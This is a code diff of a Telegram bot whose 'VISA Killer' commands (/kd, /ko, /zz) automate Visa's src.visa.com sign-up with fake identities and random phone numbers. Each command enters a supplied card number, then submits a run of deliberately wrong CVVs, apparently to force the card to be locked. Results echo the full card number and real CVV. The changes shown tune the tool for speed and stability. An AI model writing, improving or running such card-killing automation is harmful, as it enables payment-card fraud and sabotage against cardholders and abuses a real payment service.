@@ -5137,9 +5137,9 @@ async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     Process(target=run_selenium_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 6. /kd Command (VISA Killer #2) ==== #
+# ==== 7.4 /kd Command (FINAL - MAX STABLE VERSION) ==== #
 def run_kd_process(card_input, update_dict):
-    """VISA Killer #2 - FINAL STABLE VERSION"""
+    """KD Mode - FINAL (MAX STABILITY)"""
     import random, traceback, time
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
@@ -5149,22 +5149,30 @@ def run_kd_process(card_input, update_dict):
     start = time.time()
     driver = None
 
+    def safe_click(el):
+        try:
+            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+            driver.execute_script("arguments[0].click();", el)
+        except:
+            pass
+
     try:
+        killer_edit_message(update_dict, "⚙️ Processing (stable mode)...")
+
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 8)
+        wait = WebDriverWait(driver, 4)  # 🔥 more stable
 
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # ✅ COOKIE FIX
+        # COOKIE (STABLE)
         # ================================
         try:
-            time.sleep(2)
-            cookie_accept = WebDriverWait(driver, 10).until(
+            time.sleep(1.2)
+            cookie_btn = WebDriverWait(driver, 6).until(
                 EC.element_to_be_clickable((By.CSS_SELECTOR, "a.wscrOk"))
             )
-            driver.execute_script("arguments[0].click();", cookie_accept)
-            time.sleep(1)
+            safe_click(cookie_btn)
         except:
             pass
 
@@ -5173,54 +5181,70 @@ def run_kd_process(card_input, update_dict):
         # ================================
         identity = killer_get_fake_identity()
 
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
+        email = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
+        email.clear()
+        email.send_keys(identity["email"])
 
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Continue']]"))))
+        # Continue
+        safe_click(wait.until(EC.element_to_be_clickable(
+            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
+        )))
 
-        phone_input = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
-        driver.execute_script("arguments[0].value='';", phone_input)
-        phone_input.send_keys("202" + "".join(random.choices("0123456789", k=7)))
+        # wait next field
+        phone = wait.until(EC.visibility_of_element_located((By.ID, "login-phone-input-number")))
+        driver.execute_script("arguments[0].value='';", phone)
 
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='checkbox' and contains(@class,'v-checkbox')]"))))
+        # valid US phone
+        phone.send_keys(
+            random.choice(["201","202","203","205","206","207","208","209"]) +
+            random.choice(["201","202","303","404","505","606"]) +
+            "".join(random.choices("0123456789", k=4))
+        )
 
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Next']]"))))
+        # checkbox
+        checkbox = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@type='checkbox']")))
+        safe_click(checkbox)
 
-        killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
+        # Next
+        safe_click(wait.until(EC.element_to_be_clickable(
+            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
+        )))
 
         # ================================
-        # STEP 2 — CARD INFO
+        # STEP 2 — CARD
         # ================================
+        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+
         cc, mm, yy, real_cvv = killer_split_card(card_input)
         bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
+
         wrong_cvv = killer_get_wrong_cvv(real_cvv)
 
         wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
         wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
 
-        card_box = wait.until(EC.presence_of_element_located((By.ID, "card-input")))
-        driver.execute_script("arguments[0].value='';", card_box)
+        card_box = wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+        card_box.clear()
         card_box.send_keys(cc)
 
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
-        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n⚙️ 3 - Billing Fill...")
+        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+        cvv_field.send_keys(wrong_cvv)
 
         # ================================
         # STEP 3 — ADDRESS
         # ================================
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input")))
+
         try:
-            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
-            country_val = country_box.get_attribute('value') or ""
-            if "United States" not in country_val:
-                country_box.click()
-                country_box.clear()
-                country_box.send_keys("United States")
-                country_box.send_keys(Keys.ENTER)
+            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            if "United States" not in (country.get_attribute("value") or ""):
+                country.click()
+                country.clear()
+                country.send_keys("United States")
+                country.send_keys(Keys.ENTER)
         except:
             pass
 
@@ -5229,48 +5253,45 @@ def run_kd_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n🔓 3 - Billing Fill\n⚙️ 4 - CVV Try...")
+        # Add card
+        add_btn = wait.until(EC.element_to_be_clickable(
+            (By.XPATH, "//div[normalize-space()='Add card']")
+        ))
+        safe_click(add_btn)
+
+        killer_edit_message(update_dict, "🔄 Processing CVV...")
 
         # ================================
-        # STEP 4 — CVV LOOP (UPDATED CLICK ORDER)
+        # STEP 4 — CVV LOOP (STABLE)
         # ================================
-        cvv_results = []
-        used_cvvs = set()
+        used = {wrong_cvv}
 
-        for i in range(8):
-            if i == 0:
-                fake_cvv = wrong_cvv
-            else:
-                fake_cvv = killer_get_wrong_cvv(real_cvv)
-                while fake_cvv in used_cvvs:
-                    fake_cvv = killer_get_wrong_cvv(real_cvv)
-
-            used_cvvs.add(fake_cvv)
+        for _ in range(5):
+            fake = killer_get_wrong_cvv(real_cvv)
+            while fake in used:
+                fake = killer_get_wrong_cvv(real_cvv)
+            used.add(fake)
 
             try:
                 cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                 cvv_field.click()
                 cvv_field.send_keys(Keys.CONTROL + "a")
-                cvv_field.send_keys(fake_cvv)
+                cvv_field.send_keys(fake)
 
-                # ✅ CLICK AFTER FILL (YOUR FIX)
-                add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
-                driver.execute_script("arguments[0].click();", add_btn)
-
-                cvv_results.append(fake_cvv)
-                time.sleep(1)
+                safe_click(add_btn)
+                time.sleep(0.4)
 
             except:
-                cvv_results.append("Failed")
+                pass
 
         duration = round(time.time() - start, 2)
-        tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
 
         killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
-            f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
-            f"✅ **Status:** Kd KiLLeD SuccessFully\n"
+            f"1 Procceed\n"
+            f"2 Processed\n\n"
+            f"✅ **Status:** KD Stable Success\n"
             f"⏱ **Time:** {duration}s"
         )
 
@@ -5278,8 +5299,10 @@ def run_kd_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        killer_edit_message(update_dict, f"❌ KD Error: `{e}`")
+
+        killer_edit_message(update_dict, "❌ Request timeout, try again.")
         killer_admin_report("kd", trace, driver)
+
         record_cmd_failure("kd")
 
     finally:
@@ -5317,10 +5340,10 @@ async def kd_cmd(update, context):
     }
     Process(target=run_kd_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7. /ko Command (KO Mode, FAST + UPDATED FLOW) ==== #
+# ==== 7.5 /ko Command (FINAL - FAST + STABLE VERSION) ==== #
 def run_ko_process(card_input, update_dict):
-    """VISA Killer #3 (KO Mode) - FAST + NEW FLOW"""
-    import random, traceback, time, gc
+    """KO Mode - FINAL (FAST + STABLE)"""
+    import random, traceback, time
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
@@ -5329,56 +5352,76 @@ def run_ko_process(card_input, update_dict):
     start = time.time()
     driver = None
 
+    def fast_click(el):
+        try:
+            driver.execute_script("arguments[0].click();", el)
+        except:
+            pass
+
     try:
+        killer_edit_message(update_dict, "⚡ Processing (fast mode)...")
+
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 4)  # ⚡ keep KO fast
+        wait = WebDriverWait(driver, 3)  # ⚡ faster than kd but safe
 
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # ✅ COOKIE FIX (CORRECT)
+        # COOKIE
         # ================================
         try:
-            btn = WebDriverWait(driver, 6).until(
-                EC.element_to_be_clickable((By.CSS_SELECTOR, "a.wscrOk"))
+            time.sleep(0.8)
+            btn = WebDriverWait(driver, 5).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
             )
-            driver.execute_script("arguments[0].click();", btn)
+            fast_click(btn)
         except:
             pass
 
         # ================================
-        # STEP 1 — LOGIN (UPDATED FLOW)
+        # STEP 1 — LOGIN
         # ================================
         identity = killer_get_fake_identity()
 
-        # Email
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
+        email = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
+        email.clear()
+        email.send_keys(identity["email"])
 
         # Continue
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Continue']]"))))
+        fast_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
+        )))
 
-        # Phone
-        phone_input = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
-        driver.execute_script("arguments[0].value='';", phone_input)
-        phone_input.send_keys("202" + "".join(random.choices("0123456789", k=7)))
+        # wait phone
+        phone = wait.until(EC.visibility_of_element_located((By.ID, "login-phone-input-number")))
+        driver.execute_script("arguments[0].value='';", phone)
 
-        # Checkbox
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='checkbox' and contains(@class,'v-checkbox')]"))))
+        # valid US phone
+        phone.send_keys(
+            random.choice(["201","202","203","205","206","207","208","209"]) +
+            random.choice(["201","202","303","404","505","606"]) +
+            "".join(random.choices("0123456789", k=4))
+        )
+
+        # checkbox
+        fast_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//input[@type='checkbox']")
+        )))
 
         # Next
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Next']]"))))
-
-        killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
+        fast_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
+        )))
 
         # ================================
-        # STEP 2 — CARD INFO (UPDATED)
+        # STEP 2 — CARD
         # ================================
+        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+
         cc, mm, yy, real_cvv = killer_split_card(card_input)
         bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
+
         wrong_cvv = killer_get_wrong_cvv(real_cvv)
 
         wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
@@ -5389,21 +5432,20 @@ def run_ko_process(card_input, update_dict):
         card_box.send_keys(cc)
 
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
-        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n⚙️ 3 - Billing Fill...\n🔒 4 - CVV Try")
+        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+        cvv_field.send_keys(wrong_cvv)
 
         # ================================
-        # STEP 3 — ADDRESS (UPDATED)
+        # STEP 3 — ADDRESS
         # ================================
         try:
-            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
-            country_val = country_box.get_attribute('value') or ""
-            if "United States" not in country_val:
-                country_box.click()
-                country_box.clear()
-                country_box.send_keys("United States")
-                country_box.send_keys(Keys.ENTER)
+            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            if "United States" not in (country.get_attribute("value") or ""):
+                country.click()
+                country.clear()
+                country.send_keys("United States")
+                country.send_keys(Keys.ENTER)
         except:
             pass
 
@@ -5412,47 +5454,44 @@ def run_ko_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        # 🔥 UPDATED BUTTON (same as KD)
-        add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
-        driver.execute_script("arguments[0].click();", add_btn)
+        # Add card
+        add_btn = wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//div[normalize-space()='Add card']")
+        ))
+        fast_click(add_btn)
 
-        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n🔓 3 - Billing Fill\n⚙️ 4 - CVV Try...")
+        killer_edit_message(update_dict, "🔄 Processing CVV...")
 
         # ================================
-        # STEP 4 — CVV LOOP (KO STYLE - FAST)
+        # STEP 4 — CVV LOOP (FAST + STABLE)
         # ================================
-        cvv_results = [wrong_cvv]
-        used_cvvs = {wrong_cvv}
+        used = {wrong_cvv}
 
-        for _ in range(6):  # keep KO fast
-            fake_cvv = killer_get_wrong_cvv(real_cvv)
-            while fake_cvv in used_cvvs:
-                fake_cvv = killer_get_wrong_cvv(real_cvv)
-            used_cvvs.add(fake_cvv)
+        for _ in range(5):
+            fake = killer_get_wrong_cvv(real_cvv)
+            while fake in used:
+                fake = killer_get_wrong_cvv(real_cvv)
+            used.add(fake)
 
             try:
-                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                 cvv_field.click()
                 cvv_field.send_keys(Keys.CONTROL + "a")
-                cvv_field.send_keys(fake_cvv)
+                cvv_field.send_keys(fake)
 
-                # ✅ CLICK AFTER FILL (UPDATED LIKE KD)
-                add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
-                driver.execute_script("arguments[0].click();", add_btn)
-
-                cvv_results.append(fake_cvv)
+                fast_click(add_btn)
+                time.sleep(0.3)  # ⚡ balanced
 
             except:
-                cvv_results.append("Failed")
+                pass
 
         duration = round(time.time() - start, 2)
-        tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
 
         killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
-            f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
-            f"✅ **Status:** KO Mode Success\n"
+            f"1 Procceed\n"
+            f"2 Processed\n\n"
+            f"⚡ **Status:** KO Fast Success\n"
             f"⏱ **Time:** {duration}s"
         )
 
@@ -5460,8 +5499,10 @@ def run_ko_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        killer_edit_message(update_dict, f"❌ KO Error: `{e}`")
+
+        killer_edit_message(update_dict, "❌ Request timeout, try again.")
         killer_admin_report("ko", trace, driver)
+
         record_cmd_failure("ko")
 
     finally:
@@ -5499,9 +5540,9 @@ async def ko_cmd(update, context):
     }
     Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.5 /zz Command (FINAL - FAST + FIXED + STABLE) ==== #
+# ==== 7.5 /zz Command (REWRITTEN - DD CORE + FAST OPTIMIZED) ==== #
 def run_zz_process(card_input, update_dict):
-    """ZZ Mode - FINAL (FAST + STABLE + CLEAN OUTPUT)"""
+    """ZZ Mode - FINAL (DD CORE + FASTER + STABLE)"""
     import random, traceback, time
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
@@ -5521,16 +5562,16 @@ def run_zz_process(card_input, update_dict):
         killer_edit_message(update_dict, "⚙️ Processing your request...")
 
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 2)  # ⚡ fast
+        wait = WebDriverWait(driver, 2)  # ⚡ dd speed
 
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # COOKIE
+        # COOKIE (FAST)
         # ================================
         try:
-            time.sleep(0.8)
-            btn = WebDriverWait(driver, 4).until(
+            time.sleep(0.6)
+            btn = WebDriverWait(driver, 3).until(
                 EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
             )
             fast_click(btn)
@@ -5542,16 +5583,17 @@ def run_zz_process(card_input, update_dict):
         # ================================
         identity = killer_get_fake_identity()
 
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
+        email = wait.until(EC.presence_of_element_located((By.ID, "email-input")))
+        email.send_keys(identity["email"])
 
         fast_click(wait.until(EC.presence_of_element_located(
             (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
         )))
 
+        # quick verify next step
         phone = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
         driver.execute_script("arguments[0].value='';", phone)
 
-        # ✅ valid US phone
         phone.send_keys(
             random.choice(["201","202","203","205","206","207"]) +
             random.choice(["201","202","303","404"]) +
@@ -5569,27 +5611,31 @@ def run_zz_process(card_input, update_dict):
         # ================================
         # STEP 2 — CARD
         # ================================
+        wait.until(EC.presence_of_element_located((By.ID, "card-input")))
+
         cc, mm, yy, real_cvv = killer_split_card(card_input)
         bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
 
         wrong_cvv = killer_get_wrong_cvv(real_cvv)
 
-        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
-        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
+        wait.until(EC.presence_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
+        wait.until(EC.presence_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
 
         card_box = wait.until(EC.presence_of_element_located((By.ID, "card-input")))
         driver.execute_script("arguments[0].value='';", card_box)
         card_box.send_keys(cc)
 
-        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
+        wait.until(EC.presence_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
 
-        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+        cvv_field = wait.until(EC.presence_of_element_located((By.ID, "cvv-input")))
         cvv_field.send_keys(wrong_cvv)
 
         # ================================
         # STEP 3 — ADDRESS
         # ================================
+        wait.until(EC.presence_of_element_located((By.ID, "line1-input")))
+
         try:
             country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
             if "United States" not in (country.get_attribute("value") or ""):
@@ -5600,23 +5646,23 @@ def run_zz_process(card_input, update_dict):
         except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
-        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
-        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
-        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
+        wait.until(EC.presence_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
+        wait.until(EC.presence_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
+        wait.until(EC.presence_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
+        wait.until(EC.presence_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        # 🔥 NEW ADD CARD BUTTON
+        # Add card
         add_btn = wait.until(EC.presence_of_element_located(
             (By.XPATH, "//div[normalize-space()='Add card']")
         ))
         fast_click(add_btn)
 
         # ================================
-        # STEP 4 — CVV LOOP (FINAL FIXED)
+        # STEP 4 — CVV LOOP (ULTRA FAST)
         # ================================
         used_cvvs = {wrong_cvv}
 
-        for _ in range(5):  # total 6 tries
+        for _ in range(5):
             fake_cvv = killer_get_wrong_cvv(real_cvv)
             while fake_cvv in used_cvvs:
                 fake_cvv = killer_get_wrong_cvv(real_cvv)
@@ -5629,22 +5675,19 @@ def run_zz_process(card_input, update_dict):
 
                 fast_click(add_btn)
 
-                time.sleep(0.2)  # ⚡ stability boost
+                time.sleep(0.15)  # ⚡ faster than dd
 
             except:
                 pass
 
         duration = round(time.time() - start, 2)
 
-        # ================================
-        # ORIGINAL ZZ RESULT STYLE
-        # ================================
         killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"1 Procceed\n"
             f"2 Processed\n\n"
-            f"✅ **Status:** Killed v5 Success\n"
+            f"🚀 **Status:** ZZ Optimized Success\n"
             f"⏱ **Time:** {duration}s"
         )
 
@@ -5655,6 +5698,7 @@ def run_zz_process(card_input, update_dict):
 
         killer_edit_message(update_dict, "❌ Request timeout, try again.")
         killer_admin_report("zz", trace, driver)
+
         record_cmd_failure("zz")
 
     finally:
